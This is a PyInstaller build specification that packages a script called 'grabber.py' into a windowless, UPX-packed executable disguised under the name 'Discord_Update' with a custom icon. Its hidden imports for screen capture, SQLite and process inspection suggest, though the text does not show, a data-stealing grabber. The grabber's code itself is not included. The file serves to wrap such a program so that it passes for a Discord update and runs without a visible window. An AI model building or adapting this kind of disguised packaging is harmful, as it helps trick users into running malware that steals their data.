# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['utils\\grabber.py'],
    pathex=[],
    binaries=[],
    datas=[('utils\\\\config.py', '.')],
    hiddenimports=['PIL._tkinter_finder', 'PIL.Image', 'PIL.ImageGrab', 'psutil', 'sqlite3', 'utils.config'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='Discord_Update',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['utils\\icon.ico'],
)
